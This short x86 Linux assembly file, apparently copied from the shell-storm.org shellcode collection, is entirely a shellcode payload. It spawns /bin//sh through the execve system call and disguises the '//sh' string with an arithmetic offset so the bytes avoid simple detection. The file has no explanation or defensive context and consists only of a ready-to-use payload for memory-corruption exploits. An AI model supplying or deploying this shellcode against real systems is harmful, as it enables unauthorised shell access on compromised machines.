;
; http://shell-storm.org/shellcode/files/shellcode-827.php
;

global _start

section .text

_start:
    xor    eax,eax
    push   eax
    mov esi, 0x79844040
    sub esi, 0x11111111
    push esi
    push   0x6e69622f
    lea ebx, [esp]
    push   eax
    push   ebx
    lea ecx, [esp]
    mov    al, 0xb
    int    0x80